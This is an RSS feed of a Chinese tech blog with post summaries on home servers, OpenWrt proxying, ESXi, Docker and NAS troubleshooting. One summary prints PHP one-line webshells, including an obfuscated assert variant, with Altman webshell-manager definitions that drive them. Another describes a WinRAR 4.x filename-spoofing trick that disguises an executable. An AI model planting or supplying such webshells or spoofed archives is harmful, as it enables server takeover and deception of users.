<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>technology on KeePwn&#39;s Notes</title>
    <link>https://www.keepwn.com/categories/technology/</link>
    <description>Recent content in technology on KeePwn&#39;s Notes</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>zh</language>
    <copyright>© 2014 - 2021 KEEPWN.COM</copyright>
    <lastBuildDate>Sun, 09 Apr 2017 00:00:00 +0000</lastBuildDate><atom:link href="https://www.keepwn.com/categories/technology/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>构建适合程序员的私有云</title>
      <link>https://www.keepwn.com/posts/build-home-cloud-center-for-it/</link>
      <pubDate>Sun, 09 Apr 2017 00:00:00 +0000</pubDate>
      
      <guid>https://www.keepwn.com/posts/build-home-cloud-center-for-it/</guid>
      <description>&lt;h2 id=&#34;前言&#34;&gt;前言&lt;/h2&gt;
&lt;p&gt;如今网络上有很多关于如何自建NAS、搭建家庭私有云的教程，但基本都止步于文件共享和多媒体服务。&lt;br&gt;
作为一个半吊子的码农，这显然不能满足我的需求。&lt;/p&gt;
&lt;p&gt;所以，结合着自己需求搞了一套自己的私有云方案，在各种大坑小坑中坚持了近大半年后，发现该方案极大的提高了自己的工作效率。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;以下的方案不一定完全适合你，你可能需要根据自己的实际需求进行适当更改。&lt;/p&gt;
&lt;/blockquote&gt;</description>
    </item>
    
    <item>
      <title>Openwrt上实现透明代理</title>
      <link>https://www.keepwn.com/posts/see-the-big-world-on-openwrt/</link>
      <pubDate>Wed, 28 Dec 2016 00:00:00 +0000</pubDate>
      
      <guid>https://www.keepwn.com/posts/see-the-big-world-on-openwrt/</guid>
      <description>背景 前一段时间，在ESXI上部署了一台Plex服务器。解决了一些恼人的问题后，用得还算满意，但是TMDb搜刮器在匹配电影信息时，总会丢失一些Poster海报信息。
最终发现，The Movie Database (TMDb) 这个地址被和谐社会了。
由于Plex不支持设置代理，且手动设置HTTP_PROXY后还是无效，所以决定把Plex这台服务器加入透明代理网络中。
 参考以前的文章《Openwrt上使用dnsmasq和ipset实现域名分流》，将网关、DNS设置为192.168.0.254
 因为之前重新部署了ESXI环境，所以Openwrt这台虚拟机不幸丢失，所以只能大侠请重新来过。
由于之前的方案在实际使用中还有一些不足，在综合了网络上现有的一些方案后，设计出一份改进版的方案。
网络上原始的方案 安装软件  shadowsocks-libev和luci-app-shadowsocks（提供ss-rules）  依赖iptables-mod-tproxy和ip   chinadns和luci-app-chinadns  配置  使用luci-app配置shadowsocks  开启端口转发，设置本地端口为5300，用于DNS查询 被忽略IP列表选择ChinaDNS路由表（/etc/chinadns_chnroute.txt）   使用luci-app配置ChinaDNS  设置本地端口为5353 设置上游服务器为114.114.114.114,127.0.0.1:5300   使用luci-app配置DHCP/DNS  设置DNS转发为127.0.0.1#5353 勾选忽略解析文件    这样一来，你拥有了:
 一个无污染的DNS服务器，端口为53  国内DNS解析出国内IP，国外DNS解析出国外IP   一个透明代理的网关  如果请求IP在ChinaDNS路由表中，则走正常流量 如果请求IP不在ChinaDNS路由表中，则走代理流量    改进版方案 尽管上面的方案已经能够实现透明代理，但是还有以下问题(附上解决方案)：
 在某些ISP下使用ss-tunnel（即端口转发）不稳定, 导致DNS查询时间过长或超时  解决方案:  使用dnscrypt-proxy提供的DNS查询服务     ChinaDNS有时会出现误判，导致访问国内站点时走代理  解决方案:  在dnsmasq中配置chinalist，指定国内域名使用国内DNS进行解析 不在列表中的站点交由ChinaDNS判断     只能定义强制走代理的IP，而不能是域名，维护起来比较麻烦  解决方案:  归功于ss-rules的实现，ipset集合ss_spec_dst_fw中存放强制走代理的IP 在dnsmasq中配置my-list(自定义域名)列表，将my-list的查询结果保存到ss_spec_dst_fw中      额外安装以下软件:  安装dnsmasq-full  需要先卸载自带的dnsmasq   安装dnscrypt-proxy  提供安全不受污染的DNS服务器    更新配置  使用luci-app配置shadowsocks  关闭端口转发   配置dnscrypt-proxy  修改监听端口为127.</description>
    </item>
    
    <item>
      <title>富士通D2607-A11刷IT模式</title>
      <link>https://www.keepwn.com/posts/crossflashing-the-fujitsu-d2607/</link>
      <pubDate>Fri, 02 Dec 2016 00:00:00 +0000</pubDate>
      
      <guid>https://www.keepwn.com/posts/crossflashing-the-fujitsu-d2607/</guid>
      <description>准备工具  一张富士通D2607-A11阵列卡 一个U盘 一台PC机（支持UEFI启动）  准备工作  制作DOS启动盘   将U盘格式化成FAT32，刷入dos系统  下载刷机工具包点击下载 拷贝刷机所需工具   megarec软件 sas2flash软件 9211-8i固件  拷贝efi shell支持文件   在U盘根目录下，创建\efi\boot目录 复制shell_v1.efi到\efi\boot目录，重命名为bootx64.efi  开始刷固件  插上D2607-A11阵列卡 启动PC，选择U盘引导，进入DOS命令行    备份阵列卡信息
&amp;gt;dir &amp;gt;megarec -readsbr 0 sbrbak.bin   使用xdd查看sbrbak.bin的数据，在000000d0行500X XXXX XXXX XXXX为阵列卡的地址 强烈建议进行这个操作，尽管我当时忘了     刷入sbr   刷入fj版sbr &amp;gt;megarec -writesbr 0 sbrfj.bin  清空flash &amp;gt;megarec -cleanflash 0   重启PC，选择UEFI版U盘引导，进入efi shell 刷固件    刷入9211 8i固件</description>
    </item>
    
    <item>
      <title>从Hyper-V迁移到ESXI的血泪史</title>
      <link>https://www.keepwn.com/posts/moving-hyperv-to-esxi/</link>
      <pubDate>Fri, 03 Jun 2016 00:00:00 +0000</pubDate>
      
      <guid>https://www.keepwn.com/posts/moving-hyperv-to-esxi/</guid>
      <description>背景 怎么说呢，在买Gen8之前就已经仔细比较过Hyper-V和ESXI的优劣，最终选择了Hyper-V的方案。
当时决定选择Hyper-V平台有以下几个理由：
 Hyper-V提供的存储池使用方便，用起来简单 Hyper-V相对于ESXI而言比较轻量，没有ESXI那么多臃肿的功能 Hyper-V下可以实现硬盘休眠 其实最主要的原因是，觉得自己的需求不大，哪个简单用哪个  现在想来真是too young啊，我的需求怎么可能不大呢，Hyper-V自身的限制成了严重的短板。总之，在权衡未来需求和迁移成本之后，决定使用ESXI平台了。
于是，我从一条不归路Server2012 With Hyper-V走向了另一条不归路ESXI6.0。
第一坑：安装ESXI之不识别SSD 之前使用Hyper-V平台时，没有采用Gen8提供的硬件RAID功能，使用的Server2012提供的存储池功能，所以切换到ESXI平台时，重新对本地硬盘进行了硬件RAID设置。
安装ESXI到SD卡的过程略过，按正常操作来，没什么问题。在对ESXI进行配置的时候遇到了问题，系统只能识别到设置了RAID的硬盘，无法识别到SSD。
网上查了些资料，RAID模式下识别不到普通硬盘，要想识别到SSD，必须对SSD设置RAID，只有一块SSD怎么办？设置为RAID0。
第二坑：安装虚拟机之freenas 在我的规划中，所有的资料（非虚拟机文件）由freenas进行统一管理，freenas开放smb、nfs服务给其他虚拟机，一方面解决了资料分散，不易管理的问题，另一方面只要保证freenas的可用性，就算其他虚拟机崩溃甚至损坏，都不会对资料有任何影响。
创建freenas的时候，直接分配全部的磁盘空间（&amp;gt;2T）给freenas的一块虚拟磁盘，然而启动freenas时，一直卡在启动界面，显示磁盘分配错误。
虽然猜测是分配磁盘过大导致了这个问题，然而在网上并没有查阅到明确的说法。
在本地做了几个测试后发现，一旦分配磁盘大于2T，freenas就会卡死在启动界面。（真的只是个例？具体原因有待进一步分析）
当然，临时解决办法也很简单，把磁盘分拆为多个1T大小的虚拟磁盘，挂载给freenas。
第三坑：安装虚拟机之openwrt 正常方式安装openwrt，启动openwrt时，会大概率的出现卡死现象。（在《Openwrt上使用dnsmasq和ipset实现域名分流》中已经详细说明具体的原因，这里不再重复）
第四坑：安装虚拟机之dsm 首先，DSM的版本是XPEnology DSM5.2。
在Hyper-V上安装dsm非常简单，然而在ESXI上安装完成以后无法进入系统。
在正常的安装流程中，虚拟机都是由XPEnologyBoot.iso进行引导启动。简单判断以后，觉得可能由于虚拟机重启以后，未能从cd启动导致的。
进入虚拟机bios修改第一启动项为cd，保存，重新启动，WTF，怎么还是引导不了。
重新进入bios查看启动项信息，发现上次的修改并没有被保存。（在win10的vmware workstation中进行了相同操作，对vmware的修改是生效的。）
看来只能放大招了么，手动修改vmx！
修改虚拟机的.vmx文件，强制第一启动项为cdrom：
bios.bootOrder = &amp;quot;cdrom,hdd,floppy&amp;quot; 搞定。
后记 虽然说从Hyper-V切换到ESXI的过程中，遇到了很多不可描述性的问题，但好在都解决了。问我现在用着ESXI的感觉么？感觉还不错:)</description>
    </item>
    
    <item>
      <title>Pi2版OMV的Monit连接错误的问题</title>
      <link>https://www.keepwn.com/posts/error-connecting-to-the-monit-daemon-in-omv-for-pi2/</link>
      <pubDate>Thu, 17 Dec 2015 00:00:00 +0000</pubDate>
      
      <guid>https://www.keepwn.com/posts/error-connecting-to-the-monit-daemon-in-omv-for-pi2/</guid>
      <description>背景 之前买了个树莓派2，闲置了很久，最近正好有NAS需求，就打算拿它装个OpenMediaVault玩玩。
安装过程不表。
事实上是在使用过程中，遇到的某个问题比较奇葩，就拿来分享了。
林尽水源 在网页端对OMV进行配置时，经常会遇到一个弹窗monit: Cannot connect to the monit daemon. Did you start it with http support?。
详细错误代码如下：
exception &#39;OMVException&#39; with message &#39;Failed to execute command &#39;export LANG=C; monit restart collectd 2&amp;gt;&amp;amp;1&#39;: monit: Cannot connect to the monit daemon. Did you start it with http support?&#39; in /usr/share/php/openmediavault/monit.inc:113 Stack trace: #0 /usr/share/php/openmediavault/monit.inc(70): OMVMonit-&amp;gt;action(&#39;restart&#39;, &#39;collectd&#39;, false) #1 /usr/share/openmediavault/engined/module/collectd.inc(53): OMVMonit-&amp;gt;restart(&#39;collectd&#39;) #2 /usr/share/openmediavault/engined/rpc/config.inc(206): OMVModuleCollectd-&amp;gt;startService() #3 [internal function]: OMVRpcServiceConfig-&amp;gt;applyChanges(Array, Array) #4 /usr/share/php/openmediavault/rpcservice.inc(125): call_user_func_array(Array, Array) #5 /usr/share/php/openmediavault/rpcservice.</description>
    </item>
    
    <item>
      <title>Docker环境下使用open-iscsi遇到的问题</title>
      <link>https://www.keepwn.com/posts/using-open-iscsi-in-docker-container/</link>
      <pubDate>Thu, 12 Nov 2015 00:00:00 +0000</pubDate>
      
      <guid>https://www.keepwn.com/posts/using-open-iscsi-in-docker-container/</guid>
      <description>因为有业务需求，需要在docker的容器下连接iscsi磁盘。
 部署docker镜像，安装open-iscsi： test@testpc$ docker pull ubuntu:14.04 test@testpc$ docker run ubuntu:14.04 apt-get install -y open-iscsi  进入容器，运行iscsiadm： root@aaaa# iscsiadm -m discovery -t st -p 192.168.1.10 iscsiadm: can not connect to iSCSI daemon (111)! iscsiadm: can not connect to iSCSI daemon (111)! iscsiadm: Cann perform discovery. connect to iSCSI daemon (111)!   初步排查原因，可能是因为找不到iscsi的驱动。该装装，该删删，结果依旧不行。
有没有可能是docker本身的默认配置或策略问题？想到这，果然在某个docker官方文档中找到了一个参数privileged:
test@testpc$ docker help run ... --privileged=false Give extended privileges to this container ... docker容器内的root，默认情况下只是外部的一个普通用户权限，并不拥有root权限。只有使用了该参数，容器内的root才拥有真正的root权限。
尝试一下：
 使用privileged创建一个新的容器： test@testpc$ docker run --privileged --name test -t -i ubuntu:14.</description>
    </item>
    
    <item>
      <title>Altman不能成功的加载插件</title>
      <link>https://www.keepwn.com/posts/run-app-based-on-mef-from-web/</link>
      <pubDate>Mon, 28 Jul 2014 00:00:00 +0000</pubDate>
      
      <guid>https://www.keepwn.com/posts/run-app-based-on-mef-from-web/</guid>
      <description>一直有小伙伴给我反馈说：在.Net环境安装好的情况下，Altman不能自动载入插件。
而我在测试的时候，确实发生过相似的现象，但却找不到问题所在。
今天早些时候，在stackoverflow看到之前有人提到过类似的问题，恍然大悟。
原来，当我们从Web下载Altman程序的时候，程序集将会被添加一个新的安全属性（文件来自网络，已被锁定）。运行altman，由于loadFromRemoteSources默认属性是false，程序就无法加载这些插件dll。(在这里有详细的说明)
所以，解决这个问题目前有三种方法：
 手动修改Plugins目录下插件的文件属性。 在程序根目录下添加Altman.exe.config，内容如下: &amp;lt;configuration&amp;gt;&amp;lt;runtime&amp;gt;&amp;lt;loadFromRemoteSources enabled=&amp;quot;true&amp;quot;/&amp;gt;&amp;lt;/runtime&amp;gt;&amp;lt;/configuration&amp;gt; 主程序将在下一个版本2.2.1中解决该问题。  </description>
    </item>
    
    <item>
      <title>Altman连接phpEval与phpAssert一句话木马</title>
      <link>https://www.keepwn.com/posts/altman-connects-phpeval-and-phpassert-shell/</link>
      <pubDate>Thu, 10 Jul 2014 00:00:00 +0000</pubDate>
      
      <guid>https://www.keepwn.com/posts/altman-connects-phpeval-and-phpassert-shell/</guid>
      <description>之前测试altman工具的时候，遇到了一个问题，现解决方法如下：
Altman连接phpEval一句话木马的时候，phpEval.type的定义如下：
&amp;lt;customShellType&amp;gt;&amp;lt;basicSetting&amp;gt;&amp;lt;name&amp;gt;phpEval&amp;lt;/name&amp;gt;&amp;lt;serviceExample&amp;gt;&amp;lt;![CDATA[&amp;lt;?php @eval($_POST[a])?&amp;gt;]]&amp;gt;&amp;lt;/serviceExample&amp;gt;&amp;lt;mainCodeParam location=&amp;quot;Body&amp;quot; encrymode=&amp;quot;None&amp;quot; &amp;gt;passwd&amp;lt;/mainCodeParam&amp;gt;&amp;lt;/basicSetting&amp;gt;&amp;lt;mainCodeSetting&amp;gt;&amp;lt;funcCodeParam location=&amp;quot;Body&amp;quot; encrymode=&amp;quot;Base64&amp;quot; &amp;gt;funcCode&amp;lt;/funcCodeParam&amp;gt;&amp;lt;item&amp;gt;&amp;lt;![CDATA[print(&amp;quot;-&amp;gt;|&amp;quot;);eval(base64_decode($_POST[$funcCode$]));print(&amp;quot;|&amp;lt;-&amp;quot;);die();]]&amp;gt;&amp;lt;/item&amp;gt;&amp;lt;/mainCodeSetting&amp;gt;&amp;lt;/customShellType&amp;gt;eval函数执行php语句
print(&amp;quot;-&amp;gt;|&amp;quot;);eval(base64_decode($_POST[$funcCode$]));print(&amp;quot;|&amp;lt;-&amp;quot;);die();时，
确实是正确的。
然而当使用某些变形php一句话木马，如：
&amp;lt;?php $a = &amp;quot;a&amp;quot;.&amp;quot;s&amp;quot;.&amp;quot;s&amp;quot;.&amp;quot;e&amp;quot;.&amp;quot;r&amp;quot;.&amp;quot;t&amp;quot;; $a($_POST[&amp;quot;a&amp;quot;]); ?&amp;gt;
时，
Altman就无法连接一句话木马了。
原因在于，这个变形木马使用的是assert函数，而eval与assert最主要区别是eval的参数可以是多个语句，而assert的参数是一个表达式。所以assert只会执行到print(&amp;quot;-&amp;gt;|&amp;quot;)代码，后面的代码则直接报错了。
所以在了解到eval与assert的区别后，很容易写出一个新脚本类型，phpAssert.type定义如下：
&amp;lt;customShellType&amp;gt;&amp;lt;basicSetting&amp;gt;&amp;lt;name&amp;gt;phpAssert&amp;lt;/name&amp;gt;&amp;lt;serviceExample&amp;gt;&amp;lt;![CDATA[&amp;lt;?php @assert($_POST[a])?&amp;gt;]]&amp;gt;&amp;lt;/serviceExample&amp;gt;&amp;lt;mainCodeParam location=&amp;quot;Body&amp;quot; encrymode=&amp;quot;None&amp;quot; &amp;gt;passwd&amp;lt;/mainCodeParam&amp;gt;&amp;lt;/basicSetting&amp;gt;&amp;lt;mainCodeSetting&amp;gt;&amp;lt;funcCodeParam location=&amp;quot;Body&amp;quot; encrymode=&amp;quot;Base64&amp;quot; &amp;gt;funcCode&amp;lt;/funcCodeParam&amp;gt;&amp;lt;item&amp;gt;&amp;lt;![CDATA[@eval(&amp;quot;print(&#39;-&amp;gt;|&#39;);&amp;quot;.base64_decode($_POST[$funcCode$]).&amp;quot;print(&#39;|&amp;lt;-&#39;);&amp;quot;);]]&amp;gt;&amp;lt;/item&amp;gt;&amp;lt;/mainCodeSetting&amp;gt;&amp;lt;/customShellType&amp;gt;PS:其实assert还有一个坑，那就是echo在assert中是不能直接使用的，因为在php中echo并不是一个函数:)，不能作为表达式。</description>
    </item>
    
    <item>
      <title>Winrar4.x的文件欺骗漏洞利用脚本</title>
      <link>https://www.keepwn.com/posts/file-spoofing-vulnerability-winrar4-x-scripting/</link>
      <pubDate>Mon, 31 Mar 2014 00:00:00 +0000</pubDate>
      
      <guid>https://www.keepwn.com/posts/file-spoofing-vulnerability-winrar4-x-scripting/</guid>
      <description>0×00 背景 这几天仔细研究了winrar4.x系列的文件扩展名欺骗漏洞的那篇文章，通过一些测试对其有了一些新的想法和建议。（准确的说应该不能算文件扩展名欺骗漏，不止扩展名，整个文件名都是可以欺骗的）
具体的漏洞成因相信文章中都很清楚了，简单说一下：
zip格式中有2个filename，一般情况下，一般应用程序打开zip时，预览使用的是filename2，点击预览也是以filename2方式打开的，只有在解压的时候才会使用filename1。然而在winrar4.x中，点击预览是以预览filename1方式打开的。
这会造成什么结果呢？当第一个filename为readme.exe，第二个filename为readme.txt时，用winrar4.x打开时，你在程序窗口看到的文件名为readme.txt，然后你再点击文件时却是以readme.exe方式打开，这就形成漏洞了。
文章给出了如何利用这个bug的方法，更改filename2即可。但是作者是手动操作的，那么能不能写成利用脚本呢？这个filename2的长度有没有要求，需不需要和filename1长度相同？这正是本文要研究的。
0×01 细节 在研究这个问题以前，先科普一下zip格式（想看详细版的去网上下载APPNOTE.TXT）。
zip格式由3部分组成：
1. 文件内容源数据2. 目录源数据3. 目录结束标识结构 以只压缩了一个文件的zip文件为例，大致格式为：
[file header][file data][data descriptor][central directory file header][end of central directory record] 其中关键的几个字段为：
[file header]:Offset Bytes Description18 4 Compressed size26 2 File name length (n)28 2 Extra field length (m)30 n File name30+n m Extra field[central directory file header]:Offset Bytes Description28 2 File name length (n)30 2 Extra field length (m)34 2 File comment length (k)[end of central directory record]:Offset Bytes Description12 4 Size of central directory (bytes)16 4 Offset of start of central directory, relative to start of archive 在了解了zip基本格式后，我对winrar压缩生成的zip文件和用windows生成的zip文件进行了分析，它们的区别是winrar的zip文件在Extra field区段都进行了一些数据填充。</description>
    </item>
    
  </channel>
</rss>
